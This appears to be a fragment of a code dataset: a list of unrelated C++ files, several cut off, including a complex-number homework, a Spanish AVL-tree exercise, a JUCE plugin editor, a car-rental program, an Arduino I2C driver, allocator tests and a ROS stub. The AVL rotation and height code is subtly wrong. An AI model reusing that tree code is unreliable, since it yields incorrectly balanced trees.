    "  /*                               Q2.Write a C++ program to design a class complex to represent complex number. The complex class\nuses an external function (as a friend function) to add two complex number. The function should\nreturn an object of type complex representing the sum of two complex Numbers.  [20]\nAns: */\n\n#include <iostream.h>\n#include <conio.h>\n\nclass Complex {\nprivate:\n    float real;\n    float imag;\n\npublic:\n    // Constructor to initialize complex number\n    Complex(float r = 0.0, float i = 0.0) {\n        real = r;\n        imag = i;\n    }\n\n    // Friend function to add two complex numbers\n    friend Complex add(const Complex& c1, const Complex& c2);\n\n    // Function to display complex number\n    void display() {\n        cout << real << \" + \" << imag << \"i\";\n    }\n};\n\n// Friend function definition to add two complex numbers\nComplex add(const Complex& c1, const Complex& c2) {\n    Complex temp;\n    temp.real = c1.real + c2.real;\n    temp.imag = c1.imag + c2.imag;\n    return temp;\n}\n\nint main() {\n    clrscr();\n\n    Complex c1(3.5, 2.5);\n    Complex c2(2.5, 1.5);\n    Complex sum = add(c1, c2);\n\n    cout << \"First complex number: \";\n    c1.display();\n    cout << endl;\n\n    cout << \"Second complex number: \";\n    c2.display();\n    cout << endl;\n\n    cout << \"Sum of complex numbers: \";\n    sum.display();\n    cout << endl;\n\n    getch();\n    return 0;\n}\n\n",
    "// Estructuras0224.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <iostream>\n#include \"arbol.h\"\n#include \"b_tree.h\"\n\n\n//Definimos nuestra estructura, similar \n//como cuando hacemos una clase\n// \n//Puntero centro (El puntero es un espacio \n//en memoria que reservamos)\n//Este seria el padre\n//struct NodoArbol {\n//    //Se definen atributos\n//    int dato;//string, arreglo,\n//    struct NodoArbol* izquierda;\n//    //Que esto seria un puntero izquierda\n//    //Es el hijo izquiero\n//    struct NodoArbol* derecha;\n//    //Que esto seria un puntero derecha\n//    //El hijo derecho\n//};\n//\n//\n/////Crear el arbol???\n//\n////Crear el nodo, fue el 23 ingreso en datosEnviadosPorElUsuario\n//struct NodoArbol* crearNodo(int datosEnviadosPorElUsuario) {\n//    struct NodoArbol* nuevoNodo = (struct NodoArbol*)malloc(sizeof(struct NodoArbol));\n//    nuevoNodo->dato = datosEnviadosPorElUsuario;\n//    nuevoNodo->derecha = NULL;\n//    nuevoNodo->izquierda = NULL;\n//\n//    return nuevoNodo;\n//}\n//\n//struct NodoArbol* insertar(struct NodoArbol* raiz, int datosEnviadosPorElUsuario) {\n//    //14 9 85\n//    if (raiz == NULL) {\n//        return crearNodo(datosEnviadosPorElUsuario);\n//    }\n//    //era un 17 raiz->dato\n//    if (datosEnviadosPorElUsuario < raiz->dato) {\n//        raiz->izquierda = insertar(raiz->izquierda, datosEnviadosPorElUsuario);\n//    }\n//    else if (datosEnviadosPorElUsuario > raiz->dato) {\n//        raiz->derecha = insertar(raiz->derecha, datosEnviadosPorElUsuario);\n//    }\n//\n//    return raiz;\n//}\n//\n//void imprimirlos(struct NodoArbol* raiz) {\n//    if (raiz != NULL)\n//    {\n//        imprimirlos(raiz->izquierda);\n//        std::cout << \" <--\" << raiz->dato << \" --> \";\n//        imprimirlos(raiz->derecha);\n//    }\n//}\n\n\n//Arbol Balanceado ejemplo*******************************************************\n\n//Estructura del Nodo base\nstruct Nodo {\n    int dato;\n    Nodo* izquierda;\n    Nodo* derecha;\n\n    int altura;\n};\n\nint obtenerAltura(Nodo* elNodo){\n    if (elNodo == nullptr)//si viene el puntero vacio\n    {\n        return 0;//regresa la altura, si no tiene nada devuelve 0\n    }\n\n    return elNodo->altura;\n}\n\nint obtenerMaximo(int a, int b) {\n    //(a > b) ? a : b =>\n  /*  if (a > b) {\n        return a;\n    }\n    else {\n        return b;\n    }*/\n    return (a > b) ? a : b;\n}\n\n//Esta funcion permite crear un nodo, enviandole un dato\n//e incrementando 1 en su altura.\nNodo* crearElNodo(int datosEnviadorUsuario) {\n    Nodo* nodoNuevo = new Nodo();\n    nodoNuevo->dato = datosEnviadorUsuario;\n    nodoNuevo->izquierda = nullptr;\n    nodoNuevo->derecha = nullptr;\n    nodoNuevo->altura = 1; //cada vez uno nuevo la altura seria 1\n    return nodoNuevo;\n}\n\n\n//Las operaciones\nNodo* rotarDerecha(Nodo* nodoBase) {\n    Nodo* temp = nodoBase->izquierda;\n    Nodo* temp2 = nodoBase->derecha;\n\n\n    //Girar los datos, procesar los datos, o rotar datos\n    temp->derecha = nodoBase;\n    nodoBase->izquierda = temp2;\n\n\n    //Modificar la base, (la altura)\n    nodoBase->altura = obtenerMaximo(obtenerAltura(nodoBase->izquierda), obtenerAltura(nodoBase->derecha)) + 1;\n    temp->altura = obtenerMaximo(obtenerAltura(temp->izquierda), obtenerAltura(temp->derecha)) + 1;\n\n    return temp;\n}\n\n//Rotacion a la izquierda\nNodo* rotarIzquiera(Nodo* nodoBase) {\n    Nodo* temp = nodoBase->derecha;\n    Nodo* temp2 = nodoBase->izquierda;\n\n\n    //Girar los datos, procesar los datos, o rotar datos\n    temp->izquierda = nodoBase;\n    nodoBase->derecha = temp2;\n\n\n    //Modificar la base, (la altura)\n    nodoBase->altura = obtenerMaximo(obtenerAltura(nodoBase->izquierda), obtenerAltura(nodoBase->derecha)) + 1;\n    temp->altura = obtenerMaximo(obtenerAltura(temp->izquierda), obtenerAltura(temp->derecha)) + 1;\n\n    return temp;\n}\n\nint obtenerBalance(Nodo* elNodo) {\n    if (elNodo == nullptr) {\n        return 0;\n    }\n    \n    return obtenerAltura(elNodo->izquierda) - obtenerAltura(elNodo->derecha);\n\n }\n\nNodo* insertarDatosNodo(Nodo* elNodoEnviado, int datoEnviado) {\n\n    //Analiza si el puntero viene vacio, y lo crea, con el dato enviado\n    if (elNodoEnviado == nullptr) {\n        return crearElNodo(datoEnviado);\n    }\n\n    //7 < 10\n    if (datoEnviado < elNodoEnviado->dato) {\n        elNodoEnviado->izquierda = insertarDatosNodo(elNodoEnviado->izquierda, datoEnviado);\n    }\n    //10 > 8\n    else if (datoEnviado > elNodoEnviado->dato) {\n        elNodoEnviado->derecha = insertarDatosNodo(elNodoEnviado->derecha, datoEnviado);\n    }\n    //8 8\n    else {\n        return elNodoEnviado;\n    }\n\n    //A la altura le suma 1 obteniendo el valor maximo de izq y der\n    elNodoEnviado->altura = 1 + obtenerMaximo(obtenerAltura(elNodoEnviado->izquierda), obtenerAltura(elNodoEnviado->izquierda));\n\n    int balance = obtenerBalance(elNodoEnviado); //Puede ser mayor a 1 o menor a -1\n    //8 > 90\n    //Rotamos hacia la derecha\n    if (balance > 1 && datoEnviado < elNodoEnviado->izquierda->da",
    "#include \"PluginProcessor.h\"\r\n#include \"PluginEditor.h\"\r\n\r\nAudioProcessorEditor::AudioProcessorEditor(AudioProcessor& p) :\r\n    juce::AudioProcessorEditor(&p),\r\n    audioProcessor(p)\r\n{\r\n    float pi = juce::MathConstants<float>::pi;\r\n    krunchSlider.setRotaryParameters(255.0f * pi / 180.0f, 465.0f * pi / 180.0f, true);\r\n\r\n    krunchSlider.setSliderStyle(juce::Slider::SliderStyle::RotaryHorizontalVerticalDrag);\r\n    krunchSlider.setTextBoxStyle(juce::Slider::NoTextBox, false, 0, 0);\r\n    krunchSlider.setPopupDisplayEnabled(true, true, this, -1);\r\n    krunchSlider.setLookAndFeel(&lookAndFeel);\r\n    addAndMakeVisible(krunchSlider);\r\n\r\n    mixSlider.setSliderStyle(juce::Slider::SliderStyle::LinearHorizontal);\r\n    mixSlider.setTextBoxStyle(juce::Slider::NoTextBox, false, 0, 0);\r\n    mixSlider.setPopupDisplayEnabled(true, true, this, -1);\r\n    mixSlider.setLookAndFeel(&lookAndFeel);\r\n    addAndMakeVisible(mixSlider);\r\n\r\n    outputLevelSlider.setSliderStyle(juce::Slider::SliderStyle::LinearBar);\r\n    outputLevelSlider.setTextBoxStyle(juce::Slider::NoTextBox, false, 0, 0);\r\n    outputLevelSlider.setPopupDisplayEnabled(true, true, this, -1);\r\n    outputLevelSlider.setLookAndFeel(&lookAndFeel);\r\n    addAndMakeVisible(outputLevelSlider);\r\n\r\n    auto oversampleOnIcon = juce::ImageCache::getFromMemory(\r\n        BinaryData::Oversample_On_png, BinaryData::Oversample_On_pngSize);\r\n    auto oversampleOffIcon = juce::ImageCache::getFromMemory(\r\n        BinaryData::Oversample_Off_png, BinaryData::Oversample_Off_pngSize);\r\n\r\n    oversampleButton.setClickingTogglesState(true);\r\n    oversampleButton.setImages(\r\n        false, true, true,\r\n        oversampleOffIcon, 1.0f, juce::Colours::transparentBlack,\r\n        juce::Image(), 1.0f, juce::Colours::transparentBlack,\r\n        oversampleOnIcon, 1.0f, juce::Colours::transparentBlack,\r\n        0.0f);\r\n    addAndMakeVisible(oversampleButton);\r\n\r\n    auto bypassOnIcon = juce::ImageCache::getFromMemory(\r\n        BinaryData::Bypass_On_png, BinaryData::Bypass_On_pngSize);\r\n    auto bypassOffIcon = juce::ImageCache::getFromMemory(\r\n        BinaryData::Bypass_Off_png, BinaryData::Bypass_Off_pngSize);\r\n\r\n    bypassButton.setClickingTogglesState(true);\r\n    bypassButton.setImages(\r\n        false, true, true,\r\n        bypassOffIcon, 1.0f, juce::Colours::transparentBlack,\r\n        juce::Image(), 1.0f, juce::Colours::transparentBlack,\r\n        bypassOnIcon, 1.0f, juce::Colours::transparentBlack,\r\n        0.0f);\r\n    addAndMakeVisible(bypassButton);\r\n\r\n    setOpaque(true);\r\n    setSize(320, 200);\r\n}\r\n\r\nvoid AudioProcessorEditor::paint(juce::Graphics& g)\r\n{\r\n    auto image = juce::ImageCache::getFromMemory(BinaryData::Background_png, BinaryData::Background_pngSize);\r\n    g.drawImage(image, 0, 0, 320, 200, 0, 0, 640, 400);\r\n}\r\n\r\nvoid AudioProcessorEditor::resized()\r\n{\r\n    mixSlider.setBounds(10, 28, 90, 10);\r\n    outputLevelSlider.setBounds(220, 28, 90, 10);\r\n    krunchSlider.setBounds(35, 50, 250, 250);\r\n    oversampleButton.setBounds(119, 175, 31, 16);\r\n    bypassButton.setBounds(170, 175, 31, 16);\r\n}\r\n",
    "#include<iostream>\n#include<fstream>\nusing namespace std;\n\nclass Price {\npublic:\n    int days_of_rent;\n    float distance_travel;\n    float car_price_for_days;\n    float car_price_for_distance_travel;\n    float total_price;\n\n    Price() {\n        days_of_rent = 0;\n        distance_travel = 0;\n        car_price_for_days = 0;\n        car_price_for_distance_travel = 0;\n        total_price = 0;\n    }\n\n    void addprice(float daily_rent) {\n        cout << \"Days of rent: \";\n        cin >> days_of_rent;\n\n        cout << \"Distance travel: \";\n        cin >> distance_travel;\n\n        car_price_for_days = calculateCarPriceForDays(daily_rent);\n        car_price_for_distance_travel = calculateCarPriceForDistance();\n        total_price = calculateTotalPrice();\n\n        ofstream FileWriter;\n        FileWriter.open(\"jon_files.txt\", ios::app);\n        FileWriter << \"Days of rent: \" << days_of_rent << endl;\n        FileWriter << \"Distance travel: \" << distance_travel << endl;\n        FileWriter << \"Car price for days: \" << car_price_for_days << endl;\n        FileWriter << \"Car price for distance travel: \" << car_price_for_distance_travel << endl;\n        FileWriter << \"Total price: \" << total_price << endl;\n    }\n\n    float calculateCarPriceForDays(float daily_rent) {\n        return daily_rent * days_of_rent;\n    }\n\n    float calculateCarPriceForDistance() {\n        const float price_per_km = 0.5;\n        return distance_travel * price_per_km;\n    }\n\n    float calculateTotalPrice() {\n        return car_price_for_days + car_price_for_distance_travel;\n    }\n};\n\nclass Car : public Price {\n    string make;\n    string model;\n    int year;\n    double daily_rent;\n\npublic:\n    Car() {\n        make = \"\";\n        model = \"\";\n        year = 0;\n        daily_rent = 0;\n    }\n\n    string get_make() { return make; }\n    string get_model() { return model; }\n    int get_year() { return year; }\n    double get_daily_rent() { return daily_rent; }\n\n    void assign_car(int x) {\n        switch (x) {\n            case 1:\n                make = \"Toyota\";\n                model = \"Corolla\";\n                year = 2010;\n                daily_rent = 200;\n                break;\n            case 2:\n                make = \"Honda\";\n                model = \"Civic\";\n                year = 2018;\n                daily_rent = 2500;\n                break;\n            case 3:\n                make = \"Ford\";\n                model = \"Mustang\";\n                year = 2022;\n                daily_rent = 4500;\n                break;\n            case 4:\n                make = \"Chevrolet\";\n                model = \"Silverado\";\n                year = 2019;\n                daily_rent = 4000;\n                break;\n            case 5:\n                make = \"Nissan\";\n                model = \"Altima\";\n                year = 2021;\n                daily_rent = 2000;\n                break;\n            default:\n                cout << \"Invalid choice\" << endl;\n                return;\n        }\n        ofstream FileWriter;\n        FileWriter.open(\"jon_files.txt\", ios::app);\n        FileWriter << \"Car make: \" << make << endl;\n        FileWriter << \"Car model: \" << model << endl;\n        FileWriter << \"Car manufacture year: \" << year << endl;\n        FileWriter << \"Car daily rent: \" << daily_rent << endl;\n    }\n};\n\nclass Customer {\n    string customer_National_id;\n    string customer_full_name;\n    string customer_phone_number;\n\npublic:\n    int numCars;\n    Car* carTaking; // (has a)\n\n    string get_national_ID() { return customer_National_id; }\n    string get_fullName() { return customer_full_name; }\n    string get_phone_number() { return customer_phone_number; }\n\n    Customer() {\n        customer_National_id = \"\";\n        customer_full_name = \"\";\n        customer_phone_number = \"\";\n        numCars = 0;\n        carTaking = nullptr;\n    }\n    Customer(string cid, string fn, int num) {\n        customer_National_id = cid;\n        customer_full_name = fn;\n        numCars = num;\n        carTaking = new Car[numCars];\n        ofstream FileWriter;\n        FileWriter.open(\"jon_files.txt\", ios::app);\n        FileWriter << \"Customer National ID: \" << customer_National_id << endl;\n        FileWriter << \"Customer full name: \" << customer_full_name << endl;\n    }\n\n    ~Customer() {\n        delete[] carTaking;\n    }\n};\n\nint main() {\n    system(\"color f0\");\n\n    string customer_id, customer_name;\n    cout << \"Enter customer ID: \";\n    cin >> customer_id;\n    cin.ignore(); // To ignore the newline character left in the buffer\n    cout << \"Enter customer name: \";\n    getline(cin, customer_name);\n\n    Customer* st = new Customer(customer_id, customer_name, 1);\n    short choice;\n\n    for (int i = 0; i < st->numCars; i++) {\n        cout << \"Choose a Car\" << endl\n             << \"1. Toyota, Corolla, 2010, 200\" << endl\n             << \"2. Honda, Civic, 2018, 2500\" << endl\n             << \"3. Ford, Mustang, 2022, 4500\" << endl\n             << \"4. Chevrolet, Silverado, 2019, 4000\" << endl\n             << \"5. ",
    "/*\n    SPDX-FileCopyrightText: 2024 ThonkDifferent <thonkdifferent@outlook.com>\n\n    SPDX-License-Identifier: GPL-2.0-only OR GPL-3.0-only OR LicenseRef-KDE-Accepted-GPL\n*/\n\n// application header\n#include \"autoclickerlinuxwindow.h\"\n\n// KF headers\n#include <KAboutData>\n#include <KLocalizedString>\n#include <KConfig>\n#include \"VirtualMouse.h\"\n\n// Qt headers\n#include <QApplication>\n#include <QCommandLineParser>\n\nint main(int argc, char **argv)\n{\n    QApplication application(argc, argv);\n\n    KLocalizedString::setApplicationDomain(\"autoclickerlinux\");\n\n    KAboutData aboutData(QStringLiteral(\"autoclickerlinux\"),\n                         i18n(\"AutoClickerLinux\"),\n                         QStringLiteral(\"1.0\"),\n                         i18n(\"A Simple Application written with KDE Frameworks\"),\n                         KAboutLicense::GPL,\n                         i18n(\"Copyright 2024, ThonkDifferent <thonkdifferent@outlook.com>\"));\n\n    aboutData.addAuthor(i18n(\"ThonkDifferent\"),i18n(\"Author\"), QStringLiteral(\"thonkdifferent@outlook.com\"));\n    aboutData.addAuthor(i18n(\"Kommult\"),i18n(\"Icon Designer\"));\n    aboutData.setOrganizationDomain(\"example.org\");\n    aboutData.setDesktopFileName(QStringLiteral(\"org.example.autoclickerlinux\"));\n\n    KAboutData::setApplicationData(aboutData);\n    QApplication::setWindowIcon(QIcon::fromTheme(QStringLiteral(\"autoclickerlinux\")));\n\n    QCommandLineParser parser;\n    aboutData.setupCommandLine(&parser);\n\n    parser.process(application);\n    aboutData.processCommandLine(&parser);\n\n    std::unique_ptr<VirtualMouse> vmouse = std::make_unique<VirtualMouse>();\n\n    if(vmouse->failiure_code())\n        return 1;\n\n\n    AutoClickerLinuxWindow *mainWindow = new AutoClickerLinuxWindow(std::move(vmouse));\n    mainWindow->show();\n\n    return application.exec();\n}\n",
    "extern \"C\"\n{\n#include <inttypes.h>\n}\n\n#include \"Arduino.h\"\n#include \"Wire.h\"\n#include \"SM_16UNIVIN.h\"\n\nSM_16_UNIVIN::SM_16_UNIVIN(uint8_t stack)\n{\n  if (stack > 7)\n    stack = 7;\n  _hwAdd = UI_SLAVE_OWN_ADDRESS_BASE + stack;\n  _detected = false;\n}\n\nbool SM_16_UNIVIN::begin()\n{\n  uint8_t value = 0;\n  if ( 0 == readByte(UI_I2C_MEM_REVISION_MAJOR_ADD, &value))\n  {\n    _detected = true;\n  }\n  return _detected;\n}\n\nbool SM_16_UNIVIN::isAlive()\n{\n  return _detected;\n}\n\nbool SM_16_UNIVIN::writeLED(uint8_t led, bool val)\n{\n  if (led > UI_UNIV_CH_NR || led == 0)\n  {\n    return false;\n  }\n  if (val)\n  {\n    if (OK == writeByte(UI_I2C_MEM_LED_SET, led))\n      return true;\n  }\n  else\n  {\n    if (OK == writeByte(UI_I2C_MEM_LED_CLR, led))\n      return true;\n  }\n  return false;\n}\n\nbool SM_16_UNIVIN::writeLED(uint16_t val)\n{\n  if (OK == writeWord(UI_I2C_MEM_LEDS, val))\n    return true;\n  return false;\n}\n\nint SM_16_UNIVIN::readAnalogMv(uint8_t channel)\n{\n  int ret = 0;\n  uint16_t val = 0;\n\n  if (channel < 1 || channel > UI_UNIV_CH_NR)\n  {\n    return -1;\n  }\n  ret = readWord(UI_I2C_U0_10_IN_VAL1_ADD + (channel - 1) * UI_ANALOG_VAL_SIZE, &val);\n  if (ret < 0)\n    return ret;\n  return val;\n}\n\nint SM_16_UNIVIN::readRes1k(uint8_t channel)\n{\n  int ret = 0;\n  uint16_t val = 0;\n\n  if (channel < 1 || channel > UI_UNIV_CH_NR)\n  {\n    return -1;\n  }\n  ret = readWord(UI_I2C_R_1K_CH1 + (channel - 1) * UI_ANALOG_VAL_SIZE, &val);\n  if (ret < 0)\n    return ret;\n  return val;\n}\n\nint SM_16_UNIVIN::readRes10k(uint8_t channel)\n{\n  int ret = 0;\n  uint16_t val = 0;\n\n  if (channel < 1 || channel > UI_UNIV_CH_NR)\n  {\n    return -1;\n  }\n  ret = readWord(UI_I2C_R_10K_CH1 + (channel - 1) * UI_ANALOG_VAL_SIZE, &val);\n  if (ret < 0)\n    return ret;\n  return val;\n}\n\nbool SM_16_UNIVIN::readDC(uint8_t channel)\n{\n  uint16_t aux = 0;\n\n  if (channel < 1 || channel > UI_UNIV_CH_NR)\n  {\n    return ERROR;\n  }\n  if (readWord(UI_I2C_MEM_DRY_CONTACT, &aux) == OK)\n  {\n    if (aux & (1 << (channel - 1)))\n    {\n      return true;\n    }\n    else\n    {\n      return false;\n    }\n  }\n  return ERROR;\n}\n\n\nint SM_16_UNIVIN::readDC()\n{\n  uint16_t aux = 0;\n\n  if (readWord(UI_I2C_MEM_DRY_CONTACT, &aux) == OK)\n  {\n    return aux;\n  }\n  return -1;\n}\n\n\nbool SM_16_UNIVIN::cfgCounter(uint8_t channel, bool enable)\n{\n  uint16_t aux;\n\n  if (channel < 1 || channel > UI_UNIV_CH_NR)\n  {\n    return false;\n  }\n\n  if (readWord(UI_I2C_MEM_DC_CNT_ENABLE, &aux) != OK)\n  {\n    return false;\n  }\n if(enable)\n {\n\t aux |= 1 << (channel -1);\n }\n else\n {\n\t aux &= ~(1 << (channel -1));\n }\n  return (OK == writeWord(UI_I2C_MEM_DC_CNT_ENABLE, aux));\n}\n\nint SM_16_UNIVIN::readCounter(uint8_t channel)\n{\n  uint32_t val = 0;\n\n  if (channel < 1 || channel > UI_UNIV_CH_NR)\n  {\n    return ERROR;\n  }\n  if (readDWord(UI_I2C_MEM_DC_CNT_ADD + (channel - 1) * UI_COUNTER_SIZE, &val) != OK)\n  {\n    return ERROR;\n  }\n  return val;\n}\n\nbool SM_16_UNIVIN::resetCounter(uint8_t channel)\n{\n  if (channel < 1 || channel > UI_UNIV_CH_NR)\n  {\n    return false;\n  }\n  return (OK == writeByte(UI_I2C_MEM_DC_CNT_RST_ADD, channel));\n}\n\n\n/***************** UI_I2C access functions *********************************\n *  *********************************************************************\n*/\nint SM_16_UNIVIN::writeByte(uint8_t add, uint8_t value)\n{\n  Wire.begin();\n  Wire.beginTransmission(_hwAdd);\n  Wire.write(add);\n  Wire.write(value);\n  return Wire.endTransmission();\n}\n\nint SM_16_UNIVIN::writeWord(uint8_t add, uint16_t value)\n{\n  uint8_t buff[2];\n\n  memcpy(buff, &value, 2);\n  Wire.begin();\n  Wire.beginTransmission(_hwAdd);\n  Wire.write(add);\n  Wire.write(buff[0]);\n  Wire.write(buff[1]);\n  return Wire.endTransmission();\n\n}\nint SM_16_UNIVIN::writeDWord(uint8_t add, uint32_t value)\n{\n  uint8_t buff[4];\n  int i = 0;\n\n  memcpy(buff, &value, 4);\n  Wire.begin();\n  Wire.beginTransmission(_hwAdd);\n  Wire.write(add);\n  for (i = 0; i < 4; i++)\n  {\n    Wire.write(buff[i]);\n  }\n  return Wire.endTransmission();\n\n}\nint SM_16_UNIVIN::readByte(uint8_t add, uint8_t* value)\n{\n  if (0 == value)\n  {\n    return -1;\n  }\n  Wire.begin();\n  Wire.beginTransmission(_hwAdd);\n  Wire.write(add);\n  if (Wire.endTransmission() != 0)\n  {\n    return -1;\n  }\n  Wire.requestFrom(_hwAdd, (uint8_t)1);\n  if (1 <= Wire.available())\n  {\n    *value = Wire.read();\n  }\n  else\n  {\n    return -1;\n  }\n  return 0;\n}\nint SM_16_UNIVIN::readWord(uint8_t add, uint16_t* value)\n{\n  uint8_t buff[2];\n\n  if (0 == value)\n  {\n    return -1;\n  }\n  Wire.begin();\n  Wire.beginTransmission(_hwAdd);\n  Wire.write(add);\n  if (Wire.endTransmission() != 0)\n  {\n    return -1;\n  }\n  Wire.requestFrom(_hwAdd, (uint8_t)2);\n  if (2 <= Wire.available())\n  {\n    buff[0] = Wire.read();\n    buff[1] = Wire.read();\n  }\n  else\n  {\n    return -1;\n  }\n  memcpy(value, buff, 2);\n  return 0;\n}\n\nint SM_16_UNIVIN::readDWord(uint8_t add, uint32_t* value)\n{\n  uint8_t buff[4];\n  int i = 0;\n\n  if (0 == value)\n  {\n    return -1;\n  }\n  Wire.begin();\n  Wire.beginTransmission(_hwAdd);\n  Wire.write(add);\n  if (Wire.endTransmission() != 0",
    "#include <gtest/gtest.h>\n#include <logger.h>\n#include <logger_builder.h>\n#include <client_logger_builder.h>\n#include <list>\n\n#include \"../include/allocator_sorted_list.h\"\n\nlogger *create_logger(\n    std::vector<std::pair<std::string, logger::severity>> const &output_file_streams_setup,\n    bool use_console_stream = true,\n    logger::severity console_stream_severity = logger::severity::debug)\n{\n    logger_builder *builder = new client_logger_builder();\n    \n    if (use_console_stream)\n    {\n        builder->add_console_stream(console_stream_severity);\n    }\n    \n    for (auto &output_file_stream_setup: output_file_streams_setup)\n    {\n        builder->add_file_stream(output_file_stream_setup.first, output_file_stream_setup.second);\n    }\n    \n    logger *built_logger = builder->build();\n    \n    delete builder;\n    \n    return built_logger;\n}\n\nTEST(allocatorSortedListPositiveTests, test1)\n{\n    //TODO: logger\n    logger *logger_instance = create_logger(std::vector<std::pair<std::string, logger::severity>>\n                                                    {\n                                                            {\n                                                                    \"allocator_boundary_tags_tests_logs_false_positive_test_1.txt\",\n                                                                    logger::severity::information\n                                                            },\n                                                    });\n    \n    allocator *alloc = new allocator_sorted_list(3000, nullptr, logger_instance, allocator_with_fit_mode::fit_mode::first_fit);\n    \n    auto first_block = reinterpret_cast<int *>(alloc->allocate(sizeof(int), 250));\n    \n    auto second_block = reinterpret_cast<char *>(alloc->allocate(sizeof(int), 250));\n    alloc->deallocate(first_block);\n    \n    first_block = reinterpret_cast<int *>(alloc->allocate(sizeof(int), 245));\n    \n    alloc->deallocate(second_block);\n    alloc->deallocate(first_block);\n    \n    //TODO: \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430\n    \n    delete alloc;\n}\n\nTEST(allocatorSortedListPositiveTests, test2)\n{\n    \n    //TODO: logger\n    logger *logger_instance = create_logger(std::vector<std::pair<std::string, logger::severity>>\n                                                    {\n                                                            {\n                                                                    \"allocator_boundary_tags_tests_logs_false_positive_test_1.txt\",\n                                                                    logger::severity::information\n                                                            }\n                                                    });\n    \n    allocator *alloc = new allocator_sorted_list(3000, nullptr, logger_instance,\n        allocator_with_fit_mode::fit_mode::the_worst_fit);\n    \n    auto first_block = reinterpret_cast<int *>(alloc->allocate(sizeof(int), 250));\n    \n    auto *the_same_subject = dynamic_cast<allocator_with_fit_mode *>(alloc);\n    the_same_subject->set_fit_mode(allocator_with_fit_mode::fit_mode::first_fit);\n    auto second_block = reinterpret_cast<char *>(alloc->allocate(sizeof(char), 500));\n    the_same_subject->set_fit_mode(allocator_with_fit_mode::fit_mode::the_best_fit);\n    auto third_block = reinterpret_cast<double *>(alloc->allocate(sizeof(double *), 100));\n    \n    alloc->deallocate(first_block);\n    alloc->deallocate(second_block);\n    alloc->deallocate(third_block);\n    \n    //TODO: \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430\n    \n    delete alloc;\n    delete logger_instance;\n}\n\nTEST(allocatorSortedListPositiveTests, test3)\n{\n    //TODO: logger\n    logger *logger_instance = create_logger(std::vector<std::pair<std::string, logger::severity>>\n                                                    {\n                                                            {\n                                                                    \"allocator_boundary_tags_tests_logs_false_positive_test_1.txt\",\n                                                                    logger::severity::information\n                                                            }\n                                                    });\n    allocator *allocator = new allocator_sorted_list(5000, nullptr, logger_instance, allocator_with_fit_mode::fit_mode::first_fit);\n    \n    int iterations_count = 100;\n    \n    std::list<void *> allocated_blocks;\n    srand((unsigned)time(nullptr));\n    \n    for (auto i = 0; i < iterations_count; i++)\n    {\n        switch (rand() % 2)\n        {\n            case 0:\n                try\n                {\n                    allocated_blocks.push_front(allocator->allocate(sizeof(void *), rand() % 251 + 50));\n                    std::cout << \"allocation succeeded\" << std::endl;\n                }\n                catch (std::bad_alloc const &ex)\n                {\n                    std::cout << ex.what() << std::endl;\n                }\n                break;\n            case 1:\n                if (allocated_blocks.empty())\n          ",
    "#include <iostream>\n#include <vector>\n#include <format>\n\n#include \"ponder/macro/autoget_set.hpp\"\n#include \"ponder/generics/func/func.hpp\"\n\nint shit = 10;\n\ntemplate<typename T>\nclass MyClass {\n    int i = 0;\npublic:\n    template<class T1>\n    requires std::is_arithmetic_v<T1>\n    explicit MyClass(T1 v1){\n        this->i = static_cast<int>(v1);\n        std::cout << std::format(\"call copy constructor template func {}\\n\", i);\n    }\n\n    template<class T1>\n    requires std::is_arithmetic_v<T1>\n    explicit MyClass(const T1& v1){\n        this->i = static_cast<int>(v1);\n        std::cout << std::format(\"call copy constructor template func {}\\n\", i);\n    }\n\n    template<class U>\n    requires std::is_arithmetic_v<U>\n    MyClass<T> & operator =(const MyClass<U>& other){\n        this->i = other.get_i();\n        std::cout << std::format(\"call operator = template func {}\\n\", i);\n        return *this;\n    }\n\n    [[nodiscard]] int get_i() const {\n        return i;\n    }\n};\n\n\nint main()\n{\n    MyClass<int> a(5.12);\n    MyClass<double> b(10.12);\n    a = b;\n\n    std::cout << std::format(\"a.i = {}\\n\", a.get_i());\n\n\n}",
    "// Copyright 2024 Intelligent Robotics Lab\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n\n#include <string>\n#include <iostream>\n\n#include \"bt_bumpgo/Forward.hpp\"\n\n#include \"behaviortree_cpp_v3/behavior_tree.h\"\n\n#include \"geometry_msgs/msg/twist.hpp\"\n#include \"rclcpp/rclcpp.hpp\"\n\nnamespace bt_bumpgo\n{\n\nusing namespace std::chrono_literals;\n\nForward::Forward(\n  const std::string & xml_tag_name,\n  const BT::NodeConfiguration & conf)\n: BT::ActionNodeBase(xml_tag_name, conf)\n{\n  config().blackboard->get(\"node\", node_);\n\n  // Complete here: Initialize vel_pub_ to  /output_vel\n}\n\nBT::NodeStatus\nForward::tick()\n{\n  // Complete here: Fill and publish velocities\n\n  return BT::NodeStatus::RUNNING;\n}\n\n}  // namespace bt_bumpgo\n\n#include \"behaviortree_cpp_v3/bt_factory.h\"\nBT_REGISTER_NODES(factory)\n{\n  factory.registerNodeType<bt_bumpgo::Forward>(\"Forward\");\n}\n",
